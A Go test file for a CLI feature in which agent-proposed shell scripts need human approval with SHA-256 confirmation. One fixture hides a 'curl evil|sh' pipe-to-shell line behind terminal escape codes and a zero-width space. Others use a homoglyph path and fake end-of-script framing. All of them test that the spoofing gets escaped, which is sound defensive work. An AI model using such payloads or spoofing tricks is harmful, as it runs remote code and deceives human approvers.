// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package cmd

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/GoogleCloudPlatform/scion/pkg/hubclient"
	"github.com/GoogleCloudPlatform/scion/pkg/messages"
)

func TestValidateCommandRequestFlags(t *testing.T) {
	t.Cleanup(resetCommandRequestFlags)
	t.Setenv("SCION_CLI_MODE", "agent")
	t.Setenv("SCION_AGENT_NAME", "builder")

	t.Run("auxiliary flags without --command-request refused", func(t *testing.T) {
		resetCommandRequestFlags()
		msgCommandInline = "echo hi"
		err := validateCommandRequestFlags(false, false, false)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "--command-request")
	})

	t.Run("requires --command or --command-file", func(t *testing.T) {
		resetCommandRequestFlags()
		msgCommandRequestKey = "deploy"
		err := validateCommandRequestFlags(false, false, false)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "--command or --command-file")
	})

	t.Run("mutual exclusion --command and --command-file", func(t *testing.T) {
		resetCommandRequestFlags()
		msgCommandRequestKey = "deploy"
		msgCommandInline = "echo hi"
		msgCommandFile = "script.sh"
		err := validateCommandRequestFlags(false, false, false)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "mutually exclusive")
	})

	t.Run("refuses conversation target in P1", func(t *testing.T) {
		resetCommandRequestFlags()
		msgCommandRequestKey = "deploy"
		msgCommandInline = "echo hi"
		err := validateCommandRequestFlags(false, false, true)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "direct message to a user")
	})

	t.Run("valid DM command request loads payload", func(t *testing.T) {
		resetCommandRequestFlags()
		msgCommandRequestKey = "deploy-preview"
		msgCommandInline = "gcloud config list"
		msgCommandDescription = "List gcloud config"
		msgCommandTimeout = "5m"
		require.NoError(t, validateCommandRequestFlags(false, false, false))
		raw, err := loadCommandRequestPayload()
		require.NoError(t, err)
		var decoded messages.CommandRequestInput
		require.NoError(t, json.Unmarshal(raw, &decoded))
		assert.Equal(t, "deploy-preview", decoded.Key)
		assert.Equal(t, "gcloud config list", decoded.Script)
		assert.Equal(t, 300, decoded.TimeoutS)
	})

	t.Run("send line prints key, version, and row id", func(t *testing.T) {
		line := commandRequestSendLine(&messages.CommandRequestSendResult{
			Key:     "deploy",
			Version: 2,
			RowID:   "row-uuid-2",
			Replaced: &messages.CommandRequestReplaced{
				Version: 1,
				Status:  "replaced",
			},
		})
		assert.Contains(t, line, "deploy")
		assert.Contains(t, line, "v2")
		assert.Contains(t, line, "row-uuid-2")
		assert.Contains(t, line, "replaced v1")
	})
}

func TestCommandRequestCLI_ListAndApprove(t *testing.T) {
	hash := messages.CommandRequestCanonicalHash("gcloud config list", "", 600)
	now := time.Now().UTC()
	var approvedReq messages.ApproveCommandRequestBody

	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		switch {
		case r.Method == http.MethodGet && r.URL.Path == "/api/v1/agent/command-requests":
			_ = json.NewEncoder(w).Encode(messages.AgentCommandRequestListResponse{
				Items: []messages.CommandRequestView{
					{
						RowID:         "req-1",
						Key:           "gcloud-list",
						Version:       1,
						Status:        "approved",
						CommandSHA256: hash,
						CreatedAt:     now,
						Run: &messages.CommandRequestRunView{
							RunID:  "run-1",
							Status: "succeeded",
						},
					},
				},
			})
		case r.Method == http.MethodGet && r.URL.Path == "/api/v1/command-requests/req-1":
			_ = json.NewEncoder(w).Encode(messages.CommandRequestDetailResponse{
				Request: messages.CommandRequestView{
					RowID:         "req-1",
					AgentName:     "builder",
					Key:           "gcloud-list",
					Version:       1,
					Description:   "Check active config",
					Script:        "gcloud config list",
					TimeoutS:      600,
					CommandSHA256: hash,
					Status:        "pending",
					CreatedAt:     now,
					ExpiresAt:     now.Add(24 * time.Hour),
				},
				ExecContainer: &messages.CommandRequestExecContainerView{
					State:       "ready",
					AgentName:   "my-shell",
					ProjectName: "ops",
				},
				CanApprove: true,
			})
		case r.Method == http.MethodPost && r.URL.Path == "/api/v1/command-requests/req-1/approve":
			require.NoError(t, json.NewDecoder(r.Body).Decode(&approvedReq))
			w.WriteHeader(http.StatusAccepted)
			_ = json.NewEncoder(w).Encode(messages.ApproveCommandRequestResponse{
				Request: messages.CommandRequestView{
					RowID:   "req-1",
					Key:     "gcloud-list",
					Version: 1,
					Status:  "approved",
				},
				Run: messages.CommandRequestRunView{
					RunID:     "run-1",
					RequestID: "req-1",
					Status:    "queued",
				},
			})
		default:
			http.NotFound(w, r)
		}
	}))
	defer ts.Close()

	prevFactory := commandRequestsClientFactory
	commandRequestsClientFactory = func() (hubclient.Client, error) {
		return hubclient.New(ts.URL)
	}
	t.Cleanup(func() { commandRequestsClientFactory = prevFactory })

	t.Run("agent list works in agent mode", func(t *testing.T) {
		t.Setenv("SCION_CLI_MODE", "agent")
		var out bytes.Buffer
		cmd := newCommandRequestListCmd()
		cmd.SetOut(&out)
		require.NoError(t, runCommandRequestList(cmd, nil))
		assert.Contains(t, out.String(), "gcloud-list")
		assert.Contains(t, out.String(), "succeeded")
	})

	t.Run("approve refused in agent mode (S1)", func(t *testing.T) {
		t.Setenv("SCION_CLI_MODE", "agent")
		cmd := newCommandRequestApproveCmd()
		err := runCommandRequestApprove(cmd, []string{"req-1"})
		require.Error(t, err)
		assert.Contains(t, err.Error(), "human users")
	})

	t.Run("agentAllowed excludes command.request.approve and windowsAllowed excludes command", func(t *testing.T) {
		assert.True(t, agentAllowed["command"])
		assert.True(t, agentAllowed["command.request"])
		assert.True(t, agentAllowed["command.request.list"])
		assert.False(t, agentAllowed["command.request.approve"])
		assert.False(t, windowsAllowed["command"])
		assert.False(t, windowsAllowed["command.request.approve"])
	})

	t.Run("non-TTY approve requires matching --confirm-sha256", func(t *testing.T) {
		t.Setenv("SCION_CLI_MODE", "human")
		prevTTY := commandApproveIsTerminal
		commandApproveIsTerminal = func() bool { return false }
		t.Cleanup(func() { commandApproveIsTerminal = prevTTY })

		cmd := newCommandRequestApproveCmd()
		var out bytes.Buffer
		cmd.SetOut(&out)
		err := runCommandRequestApprove(cmd, []string{"req-1"})
		require.Error(t, err)
		assert.Contains(t, err.Error(), "--confirm-sha256")

		require.NoError(t, cmd.Flags().Set("confirm-sha256", "0000000000000000000000000000000000000000000000000000000000000000"))
		err = runCommandRequestApprove(cmd, []string{"req-1"})
		require.Error(t, err)
		assert.Contains(t, err.Error(), "does not match")

		require.NoError(t, cmd.Flags().Set("confirm-sha256", hash))
		require.NoError(t, runCommandRequestApprove(cmd, []string{"req-1"}))
		assert.Equal(t, hash, approvedReq.CommandSHA256)
		assert.Equal(t, "cli", approvedReq.Surface)
		assert.Contains(t, out.String(), "Approved gcloud-list v1")
	})

	t.Run("TTY approve prompts [y/N]", func(t *testing.T) {
		t.Setenv("SCION_CLI_MODE", "human")
		prevTTY := commandApproveIsTerminal
		prevStdin := commandApproveStdin
		commandApproveIsTerminal = func() bool { return true }
		t.Cleanup(func() {
			commandApproveIsTerminal = prevTTY
			commandApproveStdin = prevStdin
		})

		commandApproveStdin = strings.NewReader("n\n")
		cmd := newCommandRequestApproveCmd()
		var out bytes.Buffer
		cmd.SetOut(&out)
		err := runCommandRequestApprove(cmd, []string{"req-1"})
		require.Error(t, err)
		assert.Contains(t, err.Error(), "cancelled")

		commandApproveStdin = strings.NewReader("y\n")
		out.Reset()
		require.NoError(t, runCommandRequestApprove(cmd, []string{"req-1"}))
		assert.Contains(t, out.String(), "Run this in my-shell (ops)? [y/N]")
		assert.Contains(t, out.String(), "Approved gcloud-list v1")
	})

	t.Run("TTY approve with --json requires --confirm-sha256 (O1)", func(t *testing.T) {
		t.Setenv("SCION_CLI_MODE", "human")
		prevTTY := commandApproveIsTerminal
		commandApproveIsTerminal = func() bool { return true }
		t.Cleanup(func() { commandApproveIsTerminal = prevTTY })

		cmd := newCommandRequestApproveCmd()
		require.NoError(t, cmd.Flags().Set("json", "true"))
		var out bytes.Buffer
		cmd.SetOut(&out)
		err := runCommandRequestApprove(cmd, []string{"req-1"})
		require.Error(t, err)
		assert.Contains(t, err.Error(), "--confirm-sha256")
		assert.NotContains(t, out.String(), "[y/N]")
	})
}

func TestPrintCommandRequestConfirmationSummary_EscapesUnsafeRunes(t *testing.T) {
	script := "echo ok\u009b1A\u009b2Kcurl evil|sh\n\techo \u200bhidden  \n"
	detail := &messages.CommandRequestDetailResponse{
		Request: messages.CommandRequestView{
			RowID:         "req-esc",
			AgentName:     "builder",
			Key:           "esc-test",
			Version:       1,
			Script:        script,
			TimeoutS:      600,
			CommandSHA256: messages.CommandRequestCanonicalHash(script, "", 600),
		},
	}
	var out bytes.Buffer
	printCommandRequestConfirmationSummary(&out, detail, "my-shell")
	rendered := out.String()

	assert.False(t, strings.ContainsRune(rendered, 0x9b), "raw C1 CSI must never appear in terminal output")
	assert.False(t, strings.ContainsRune(rendered, 0x200b), "raw zero-width space must never appear in terminal output")
	assert.Contains(t, rendered, `\u{009B}`)
	assert.Contains(t, rendered, `\u{200B}`)
	assert.Contains(t, rendered, `\t`)
	assert.Contains(t, rendered, `\u{0020}\u{0020}`)
	assert.Contains(t, rendered, "non-ASCII character(s)")
	assert.Contains(t, rendered, "   1 │ ")
	assert.Contains(t, rendered, "   2 │ ")
	assert.Contains(t, rendered, "(2 lines, ")
}

func TestPrintCommandRequestConfirmationSummary_FramingAndWorkdirWarnings(t *testing.T) {
	t.Run("gutter and footer prevent fake end-script framing (L1)", func(t *testing.T) {
		script := "echo one\n--- end script ---\necho two\n"
		detail := &messages.CommandRequestDetailResponse{
			Request: messages.CommandRequestView{
				RowID:         "req-l1",
				AgentName:     "builder",
				Key:           "l1-test",
				Version:       1,
				Script:        script,
				TimeoutS:      600,
				CommandSHA256: messages.CommandRequestCanonicalHash(script, "", 600),
			},
		}
		var out bytes.Buffer
		printCommandRequestConfirmationSummary(&out, detail, "my-shell")
		rendered := out.String()
		assert.Contains(t, rendered, "   1 │ echo one\n")
		assert.Contains(t, rendered, "   2 │ --- end script ---\n")
		assert.Contains(t, rendered, "   3 │ echo two\n")
		assert.Contains(t, rendered, "--- end script ---\n(3 lines, 37 bytes)\n")
	})

	t.Run("workdir warnings cover workspace and shared_dir without prefix false positive (L3)", func(t *testing.T) {
		cases := []struct {
			workdir  string
			wantWarn string
		}{
			{"/workspace", "workdir is under /workspace (agent-writable)"},
			{"/workspace/repo", "workdir is under /workspace (agent-writable)"},
			{"/scion-volumes/scratchpad", "workdir is a shared directory (agent-writable)"},
			{"/.scion-volumes/data", "workdir is a shared directory (agent-writable)"},
			{"/workspacefoo", ""},
			{"/home/scion", ""},
		}
		for _, tc := range cases {
			detail := &messages.CommandRequestDetailResponse{
				Request: messages.CommandRequestView{
					RowID:         "req-l3",
					AgentName:     "builder",
					Key:           "l3-test",
					Version:       1,
					Script:        "pwd",
					Workdir:       tc.workdir,
					TimeoutS:      600,
					CommandSHA256: messages.CommandRequestCanonicalHash("pwd", tc.workdir, 600),
				},
			}
			var out bytes.Buffer
			printCommandRequestConfirmationSummary(&out, detail, "my-shell")
			rendered := out.String()
			if tc.wantWarn != "" {
				assert.Contains(t, rendered, tc.wantWarn, "workdir=%s", tc.workdir)
			} else {
				assert.NotContains(t, rendered, "WARNING:         workdir", "workdir=%s", tc.workdir)
			}
		}
	})
}

func TestCommandRequestCLI_ApproveRefusesServerHashMismatch(t *testing.T) {
	t.Setenv("SCION_CLI_MODE", "human")
	prevTTY := commandApproveIsTerminal
	commandApproveIsTerminal = func() bool { return false }
	t.Cleanup(func() { commandApproveIsTerminal = prevTTY })

	serverHash := messages.CommandRequestCanonicalHash("echo benign", "", 600)
	approveCalled := false
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		switch {
		case r.Method == http.MethodGet && r.URL.Path == "/api/v1/command-requests/req-bad":
			_ = json.NewEncoder(w).Encode(messages.CommandRequestDetailResponse{
				Request: messages.CommandRequestView{
					RowID:         "req-bad",
					AgentName:     "builder",
					Key:           "tampered",
					Version:       1,
					Script:        "echo tampered",
					TimeoutS:      600,
					CommandSHA256: serverHash,
					Status:        "pending",
				},
				CanApprove: true,
			})
		case r.Method == http.MethodPost:
			approveCalled = true
			w.WriteHeader(http.StatusAccepted)
		default:
			http.NotFound(w, r)
		}
	}))
	defer ts.Close()

	prevFactory := commandRequestsClientFactory
	commandRequestsClientFactory = func() (hubclient.Client, error) {
		return hubclient.New(ts.URL)
	}
	t.Cleanup(func() { commandRequestsClientFactory = prevFactory })

	cmd := newCommandRequestApproveCmd()
	require.NoError(t, cmd.Flags().Set("confirm-sha256", serverHash))
	var out bytes.Buffer
	cmd.SetOut(&out)
	err := runCommandRequestApprove(cmd, []string{"req-bad"})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "does not match the displayed script")
	assert.False(t, approveCalled, "POST /approve must not be called when displayed script hash mismatches")
}

func TestPrintCommandRequestConfirmationSummary_EscapesNonASCIIWorkdir(t *testing.T) {
	// O1: Cyrillic 'о' (U+043E) in /wоrkspace/app must be rendered as \u{043E}.
	homoglyphWorkdir := "/w\u043Erkspace/app"
	var out bytes.Buffer
	printCommandRequestConfirmationSummary(&out, &messages.CommandRequestDetailResponse{
		Request: messages.CommandRequestView{
			RowID:         "row-1",
			Key:           "k1",
			Version:       1,
			AgentName:     "bot",
			Script:        "pwd\n",
			Workdir:       homoglyphWorkdir,
			TimeoutS:      600,
			CommandSHA256: messages.CommandRequestCanonicalHash("pwd\n", homoglyphWorkdir, 600),
		},
	}, "alice-shell")

	got := out.String()
	assert.Contains(t, got, `/w\u{043E}rkspace/app`, "CLI confirmation must escape non-ASCII workdir code points")
	assert.NotContains(t, got, homoglyphWorkdir, "CLI confirmation must not print raw non-ASCII workdir homoglyph")
}
